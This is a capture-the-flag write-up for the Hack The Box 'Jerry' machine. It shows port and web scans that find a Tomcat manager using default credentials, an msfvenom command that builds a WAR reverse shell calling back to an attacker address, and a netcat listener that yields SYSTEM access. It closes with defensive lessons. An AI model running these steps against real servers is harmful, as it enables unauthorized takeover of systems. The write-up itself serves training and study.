# Jerry Writeup w/o Metasploit

![](https://miro.medium.com/max/590/1*6vyFg1efjSxOXiLaY5BQtA.png)

## Reconnaissance <a id="b0d4"></a>

Run the [nmapAutomato](https://github.com/rkhal101/nmapAutomator)r script to enumerate open ports and services running on those ports.

```text
./nmapAutomator.sh 10.10.10.95 All
```

* **All**: Runs all the scans consecutively.

We get back the following result.

```text
Running all scans on 10.10.10.95Host is likely running Windows---------------------Starting Nmap Quick Scan---------------------Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-20 00:01 EST
Nmap scan report for 10.10.10.95
Host is up (0.043s latency).
Not shown: 999 filtered ports
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE
8080/tcp open  http-proxyNmap done: 1 IP address (1 host up) scanned in 6.04 seconds---------------------Starting Nmap Basic Scan---------------------Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-20 00:01 EST
Nmap scan report for 10.10.10.95
Host is up (0.16s latency).PORT     STATE SERVICE VERSION
8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
|_http-favicon: Apache Tomcat
|_http-server-header: Apache-Coyote/1.1
|_http-title: Apache Tomcat/7.0.88Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.96 seconds----------------------Starting Nmap UDP Scan----------------------Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-20 00:01 EST
Nmap scan report for 10.10.10.95
Host is up.
All 1000 scanned ports on 10.10.10.95 are open|filteredNmap done: 1 IP address (1 host up) scanned in 201.63 seconds---------------------Starting Nmap Full Scan----------------------
                                                                                                                                                                               
Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-20 00:05 EST
Initiating Parallel DNS resolution of 1 host. at 00:05
Completed Parallel DNS resolution of 1 host. at 00:05, 0.02s elapsed
Initiating SYN Stealth Scan at 00:05
Scanning 10.10.10.95 [65535 ports]
Discovered open port 8080/tcp on 10.10.10.95
.....
Nmap scan report for 10.10.10.95
Host is up (0.041s latency).
Not shown: 65534 filtered ports
PORT     STATE SERVICE
8080/tcp open  http-proxyRead data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 262.85 seconds
           Raw packets sent: 131271 (5.776MB) | Rcvd: 324 (33.413KB)No new ports---------------------Starting Nmap Vulns Scan---------------------
                                                                                                                                                                               
Running CVE scan on basic ports
                                                                                                                                                                               
Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-20 00:09 EST
/usr/local/bin/nmapAutomator.sh: line 226:  2536 Segmentation fault      $nmapType -sV --script vulners --script-args mincvss=7.0 -p$(echo "${ports}") -oN nmap/CVEs_"$1".nmap "$1"Running Vuln scan on basic ports
                                                                                                                                                                               
Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-20 00:09 EST
Nmap scan report for 10.10.10.95
Host is up (0.040s latency).PORT     STATE SERVICE VERSION
8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-enum: 
|   /examples/: Sample scripts
|   /manager/html/upload: Apache Tomcat (401 Unauthorized)
|   /manager/html: Apache Tomcat (401 Unauthorized)
|_  /docs/: Potentially interesting folder
.....Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 144.18 seconds---------------------Recon Recommendations----------------------Web Servers Recon:
                                                                                                                                                                               
gobuster dir -w /usr/share/wordlists/dirb/common.txt -l -t 30 -e -k -x .html,.php -u http://10.10.10.95:8080 -o recon/gobuster_10.10.10.95_8080.txt
nikto -host 10.10.10.95:8080 | tee recon/nikto_10.10.10.95_8080.txtWhich commands would you like to run?                                                                                                                                          
All (Default), gobuster, nikto, Skip <!>Running Default in (1) s:---------------------Running Recon Commands----------------------Starting gobuster scan
                                                                                                                                                                               
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.95:8080
[+] Threads:        30
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Show length:    true
[+] Extensions:     php,html
[+] Expanded:       true
[+] Timeout:        10s
===============================================================
2020/02/20 00:12:20 Starting gobuster
===============================================================
http://10.10.10.95:8080/aux (Status: 200) [Size: 0]
http://10.10.10.95:8080/com2 (Status: 200) [Size: 0]
http://10.10.10.95:8080/com1 (Status: 200) [Size: 0]
http://10.10.10.95:8080/com3 (Status: 200) [Size: 0]
http://10.10.10.95:8080/con (Status: 200) [Size: 0]
http://10.10.10.95:8080/docs (Status: 302) [Size: 0]
http://10.10.10.95:8080/examples (Status: 302) [Size: 0]
http://10.10.10.95:8080/favicon.ico (Status: 200) [Size: 21630]
http://10.10.10.95:8080/host-manager (Status: 302) [Size: 0]
http://10.10.10.95:8080/lpt1 (Status: 200) [Size: 0]
http://10.10.10.95:8080/lpt2 (Status: 200) [Size: 0]
http://10.10.10.95:8080/manager (Status: 302) [Size: 0]
http://10.10.10.95:8080/nul (Status: 200) [Size: 0]
===============================================================
2020/02/20 00:13:08 Finished
===============================================================Finished gobuster scan
                                                                                                                                                                               
=========================
                                                                                                                                                                               
Starting nikto scan
                                                                                                                                                                               
- Nikto v2.1.6
--------------------------------------------------------------------
+ Target IP:          10.10.10.95
+ Target Hostname:    10.10.10.95
+ Target Port:        8080
+ Start Time:         2020-02-20 00:13:09 (GMT-5)
--------------------------------------------------------------------
+ Server: Apache-Coyote/1.1
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ OSVDB-39272: /favicon.ico file identifies this app/server as: Apache Tomcat (possibly 5.5.26 through 8.0.15), Alfresco Community
+ Allowed HTTP Methods: GET, HEAD, POST, PUT, DELETE, OPTIONS 
+ OSVDB-397: HTTP method ('Allow' Header): 'PUT' method could allow clients to save files on the web server.
+ OSVDB-5646: HTTP method ('Allow' Header): 'DELETE' may allow clients to remove files on the web server.
+ Web Server returns a valid response with junk HTTP methods, this may cause false positives.
+ /examples/servlets/index.html: Apache Tomcat default JSP pages present.
+ OSVDB-3720: /examples/jsp/snp/snoop.jsp: Displays information about page retrievals, including other users.
+ Default account found for 'Tomcat Manager Application' at /manager/html (ID 'tomcat', PW 's3cret'). Apache Tomcat.
+ /host-manager/html: Default Tomcat Manager / Host Manager interface found
+ /manager/html: Tomcat Manager / Host Manager interface found (pass protected)
+ /manager/status: Tomcat Server Status interface found (pass protected)
+ 7967 requests: 0 error(s) and 14 item(s) reported on remote host
+ End Time:           2020-02-20 00:19:31 (GMT-5) (382 seconds)
--------------------------------------------------------------------
+ 1 host(s) testedFinished nikto scan
                                                                                                                                                                               
=========================
                                                                                                                                                                                                                                                                                                                                    
                                                                                                                                                                               
---------------------Finished all Nmap scans---------------------Completed in 18 minute(s) and 8 second(s)
```

We have one port open.

* **Port 8080:** running Apache Tomcat/Coyote JSP engine 1.1

Before we move on to enumeration, let’s make some mental notes about the scan results.

* Port 8080 is running Apache Tomcat and the nmap scan found the _/manager/html_ page, which is the login page to the Manager interface. The nikto scan identified that this page is using the default credentials _tomcat_/_s3cret_. Apache Tomcat by design allows you to run code, so we can simply deploy a war file that sends a reverse shell back to our attack machine.

Since we already have a way to get code execution on the box, we can just move on to the exploitation phase.

## Exploitation <a id="103d"></a>

Visit the _/manager/html_ page and log in with the credentials _tomcat_/_s3cret_.

![](https://miro.medium.com/max/1262/0*96G4tbEOOt4tJEtC.png)

Generate a war file that contains a reverse shell using msfvenom.

```text
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.7 LPORT=1234 -f war > shell.war
```

Upload the file on the Tomcat Application Manager and deploy it.

![](https://miro.medium.com/max/779/0*Ux835eO81J5k30zh.png)

Set up a listener on the target machine.

```text
nc -nlvp 1234
```

Click on the war file in the Tomcat Application Manager to execute our shell.

![](https://miro.medium.com/max/898/1*pvM-CqHbJfyGeOeIA1mpxA.png)

We get a shell with SYSTEM privileges! That was easy! We don’t even have to escalate our privileges for this box.

Grab the _user.txt_ and _root.txt_ flags.

![](https://miro.medium.com/max/964/1*HMxNDHZ88LP6-up5-7QdwQ.png)

## Lessons Learned <a id="fbcc"></a>

To get SYSTEM on this box, we exploited two vulnerabilities.

* Use of Default Credentials. There was an exposed port that was running Apache Tomcat. The administrator had used default credentials for the manager interface. This allowed us to access the interface and deploy a war file that gave us access to the server. Since default credentials are publicly available and can be easily obtained, the administrator should have instead used a sufficiently long password that is difficult to crack.
* Least Privilege Violation. Tomcat doesn’t need SYSTEM privileges to function properly. Instead it should have been run under a tomcat user account that has limited privileges. This way, even if we did get access to the box, we would have needed to find a way to escalate privileges, instead of immediately getting SYSTEM access without having to work for it. The administrator should have conformed to the principle of least privilege.

